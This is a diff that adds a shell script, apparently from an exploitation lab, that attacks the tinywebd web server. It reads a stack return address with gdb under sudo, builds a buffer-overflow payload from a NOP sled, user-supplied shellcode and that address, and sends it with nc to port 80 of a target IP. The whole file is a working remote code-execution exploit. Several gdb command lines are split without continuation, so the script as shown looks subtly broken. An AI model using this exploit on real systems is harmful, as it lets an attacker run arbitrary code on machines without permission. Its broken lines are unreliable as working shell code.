@@ -1,0 +1,33 @@
+#!/bin/sh
+# a tool for exploiting tinywebd
+
+if [ -z "$2" ]; then  # if argument 2 is blank
+   echo "Usage: $0 <shellcode file> <target IP>"
+   exit
+fi 
+
+./tinywebd
+pid=$(pidof tinywebd)
+
+OFFSET=524  # changed to work on eve
+
+#RETADDR="\xe4\x9a\xd2\xbf" # 
+sudo gdb -q -pid=$pid --symbols=./tinywebd --batch -ex "break 86" 
+--batch -ex "c"--batch -ex "set logging on gdblog" --batch -ex "x/x request+100"
+--batch -ex "set logging off" --batch -ex "quit"
+
+RETADDR=$(cut -d: -f1 gdblog | sed 's/\(.\{2\}\)/\1 /g' | 
+awk '{ print "\\x"$5"\\x"$4"\\x"$3"\\x"$2}')
+rm -f gdblog
+
+echo "target IP: $2"
+SIZE=`wc -c $1 | cut -f1 -d ' '`
+echo "shellcode: $1 ($SIZE bytes)"
+ALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE))
+
+echo "[NOP ($ALIGNED_SLED_SIZE bytes)] [shellcode ($SIZE bytes)] [ret addr ($((4*32)) 
+bytes)]"
+( perl -e "print \"\x90\"x$ALIGNED_SLED_SIZE";
+ cat $1;
+ perl -e "print \"$RETADDR\"x32 . \"\r\n\"";) | nc -w 1 -v $2 80
+
